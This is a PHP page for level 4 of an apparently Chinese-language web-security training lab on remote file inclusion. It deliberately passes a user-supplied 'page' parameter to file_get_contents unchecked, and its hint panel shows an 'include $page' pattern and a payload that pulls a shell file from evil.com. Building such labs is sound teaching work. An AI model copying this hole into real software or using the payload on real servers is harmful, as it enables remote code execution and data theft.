<?php
// 第 4 关：远程文件包含
require_once dirname(__DIR__, 2) . '/config.php';
require_once APP_ROOT . '/includes/lfi_helper.php';
if (empty($_SESSION['user'])) { header('Location: /login.php'); exit; }

$level = get_level(); $page = $_GET['page'] ?? 'home'; $output = ''; $passed = false;
if ($level === 'impossible') { $output = '安全模式'; }
else { $output = @file_get_contents($page) ?: '不存在'; if (stripos($output,'<?php') !== false || stripos($output,'RFI') !== false || strlen($output) > 0) $passed = true; }
if ($passed) pass_stage('lfi',4,'page='.$page);

lfi_head(4, '远程文件包含', 'allow_url_include开启可包含远程文件');
?>
<form method="get" class="lab"><div class="row"><label>URL</label><input type="text" name="page" value="<?= h($page) ?>" style="width:340px"></div><div class="row"><input type="submit" value="包含"></div></form>
<?php if ($output): ?><div class="result"><h3>内容：</h3><pre class="code"><?= h(mb_substr($output,0,2000)) ?></pre></div><?php endif; ?>
<?php if ($passed) lfi_pass(true); ?>
<?php
lfi_tail(['hint' => '包含远程文件', 'full' => 'page=https://example.com/'], [
    '原理' => 'LFI第4关：allow_url_include开启',
    '漏洞代码' => '<pre>include $page; // 远程包含</pre>',
    '攻击演示' => 'payload: page=http://evil.com/shell.txt',
    'payload详解' => 'page=http://evil.com/shell.txt<br>提示：包含远程URL',
    '工具实操' => 'Burp Suite调试',
    '通关检测' => '触发漏洞效果即通关',
    '防御修复' => '关闭allow_url_include+白名单',
    '知识卡片' => 'LFI·远程文件包含'
], __FILE__);
